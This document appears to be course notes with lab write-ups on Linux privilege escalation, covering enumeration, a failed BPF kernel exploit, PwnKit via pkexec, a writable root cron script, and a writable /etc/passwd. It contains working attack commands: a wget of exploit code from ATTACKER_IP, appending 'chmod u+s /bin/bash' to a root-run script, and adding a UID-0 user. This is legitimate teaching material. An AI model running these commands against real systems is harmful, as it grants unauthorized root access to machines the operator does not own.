# Week 5 - Linux Privilege Escalation

These are lab writeups rather than only a command reference. For each host,
the useful pattern is:

1. Enumerate the operating system and kernel.
2. Check common privilege-escalation paths.
3. Validate a promising finding before exploiting it.
4. Confirm the new privilege level with `whoami`.

## Connecting to the lab machines

The following SSH options prevent a lab host from being added to
`known_hosts`:

```bash
ssh -o "UserKnownHostsFile=/dev/null" \
    -o "StrictHostKeyChecking=no" \
    -p 2222 student@TARGET_IP
```

Replace `TARGET_IP` with the address for the current lab. Keep the shell
prompt out of commands when copying them into notes.

## Common Linux enumeration

Start with the distribution, kernel, architecture, current identity, and
sudo permissions:

```bash
cat /etc/os-release
uname -a
uname -r
arch
id
sudo -l
cat /proc/version
```

For example, one lab reported:

```text
Ubuntu 16.04.4 LTS
4.4.0-116-generic
x86_64
```

Search for kernel exploits only after collecting the exact version:

```bash
searchsploit 4.4.0-116
```

Online searches can also be narrowed to Exploit-DB:

```text
site:exploit-db.com 4.4.0-116 privilege escalation
```

### SUID, SGID, and capabilities

```bash
find / -perm -4000 -type f 2>/dev/null  # SUID
find / -perm -2000 -type f 2>/dev/null  # SGID
getcap -r / 2>/dev/null
```

Do not treat every result as exploitable. Check unusual binaries against
[GTFOBins](https://gtfobins.github.io/) and inspect their version and
permissions:

```bash
ls -la /usr/bin/pkexec
pkexec --version
```

### Cron and writable files

```bash
cat /etc/crontab
cat /etc/cron.d/*
cat /etc/cron.daily/*
cat /etc/cron.hourly/*
cat /etc/cron.monthly/*
cat /etc/cron.weekly/*
grep -i cron /var/log/syslog
tail /var/log/cron.log
journalctl -u cron
```

Useful permission searches:

```bash
find / -writable -type f 2>/dev/null
find / -perm -o+w -type d 2>/dev/null
find / -user root -perm -o+w 2>/dev/null
find / -name '*.conf' -readable 2>/dev/null
```

The important question is not “is this file writable?” but “does a
privileged process read or execute this file?”

---

## Lab 1 - PwnKit / `pkexec`

### Finding

The target looked like an old Ubuntu host. The initial exploit attempt was a
kernel exploit, but it failed because unprivileged BPF was disabled:

```bash
sysctl kernel.unprivileged_bpf_disabled
sysctl kernel.unprivileged_userns_clone
```

Example result:

```text
kernel.unprivileged_bpf_disabled = 1
kernel.unprivileged_userns_clone = 1
```

The SUID enumeration showed `pkexec`:

```text
/usr/bin/pkexec
```

Validate the candidate before choosing a PwnKit proof of concept:

```bash
ls -la /usr/bin/pkexec
pkexec --version
```

Example result:

```text
-rwsr-xr-x 1 root root 23376 Jan 17  2016 /usr/bin/pkexec
pkexec version 0.105
```

### Failed kernel exploit

The first proof of concept was transferred and compiled successfully, but
the target rejected the BPF operation:

```bash
wget http://ATTACKER_IP/45010.c
gcc 45010.c -o 45010
file 45010
./45010
```

Relevant output:

```text
[*] creating bpf map
[!] failed to create bpf map: 'Operation not permitted'
```

This was a useful negative result: the kernel version alone was not enough.
The host's security settings also mattered.

### PwnKit lab attempt

The lab files were compiled separately:

```bash
gcc -shared -o evil.so -fPIC evil-so.c
gcc exploit.c -o exploit
```

Running `exploit` without `./` failed because the current directory was not
in `PATH`:

```text
exploit: command not found
```

Run a local executable explicitly:

```bash
./exploit
```

The successful shell confirmed the escalation:

```text
# whoami
root
```

### Lesson

When a kernel exploit fails, continue enumeration. Here, SUID `pkexec` was a
better lead than repeatedly retrying the BPF exploit. Always verify:

- exact OS and kernel version;
- architecture;
- `pkexec` version and SUID bit;
- whether the proof of concept matches the target.

---

## Lab 2 - Writable script executed by cron

### Finding the scheduled job

List the cron directories and inspect the system crontab:

```bash
ls -la /etc/cron* /var/spool/cron 2>/dev/null
cat /etc/crontab
```

The relevant system entry was:

```text
17 * * * * root cd / && run-parts --report /etc/cron.hourly
```

One hourly script was called `archiver`:

```bash
find / -name '*archiver*' 2>/dev/null
ls -l /etc/cron.hourly/archiver
cat /etc/cron.hourly/archiver
```

Its contents were:

```sh
#!/bin/sh
/var/archives/archive.sh
```

The cron wrapper itself was not writable, but the script it called was:

```bash
ls -lah /var/archives/archive.sh
```

Example result:

```text
-rwxrwxrwx 1 root root 159 Nov 15  2021 /var/archives/archive.sh
```

This gives the complete escalation chain:

```text
root cron -> /etc/cron.hourly/archiver -> /var/archives/archive.sh
```

### Exploiting the writable script

Inspect the script before changing it:

```bash
cat /var/archives/archive.sh
```

The lab script contained a backup operation and was executed by root. Append
a command that sets the SUID bit on Bash:

```bash
echo 'chmod u+s /bin/bash' >> /var/archives/archive.sh
```

Wait for the next scheduled run. The cron log showed the job running every
minute on this lab host:

```bash
tail /var/log/cron.log
```

Confirm that the SUID bit was set:

```bash
ls -lah /bin/bash
```

Example result:

```text
-rwsr-xr-x 1 root root 1.2M Oct 15  2020 /bin/bash
```

Starting Bash normally did not preserve the effective privileges:

```bash
/bin/bash
whoami
```

```text
student
```

Use privileged mode instead:

```bash
bash -p
whoami
```

```text
root
```

### Lesson

Follow every executable in a scheduled job. A root-owned cron file can still
be exploitable when it calls a different script that is writable by the
current user. Check the schedule and the log so you know when the modified
script has run.

---

## Lab 3 - Writable `/etc/passwd`

### Finding

The permission search produced many noisy pseudo-files under `/proc`, so
focus on normal filesystem paths and privileged configuration files:

```bash
find / -writable -type f 2>/dev/null
find / -user root -perm -o+w 2>/dev/null
```

In this lab, `/etc/passwd` was writable:

```text
/etc/passwd
```

### Exploiting the file

If the file is writable, append a user with UID 0 and GID 0. The password
field must contain a valid hash for the password selected in the lab:

```bash
echo 'root2:PASSWORD_HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
su root2
```

hash can be made using `openssl passwd -6` or `mkpasswd -m sha-512`.

Confirm the resulting identity:

```bash
whoami
```

```text
root
```

This technique is specific to a writable authentication database and should
not be used on systems you do not own or have permission to test.

### Lesson

Permission findings need context. A world-writable directory is not enough by
itself; identify what runs from it, who runs that process, and whether your
changes affect the privileged execution path.

---

## Quick reference

```bash
# System information
cat /etc/os-release
uname -a
id
sudo -l

# SUID, SGID, capabilities
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
getcap -r / 2>/dev/null

# Cron
cat /etc/crontab
ls -la /etc/cron* /var/spool/cron 2>/dev/null
grep -i cron /var/log/syslog
tail /var/log/cron.log

# Writable targets
find / -writable -type f 2>/dev/null
find / -user root -perm -o+w 2>/dev/null
find / -perm -o+w -type d 2>/dev/null
```
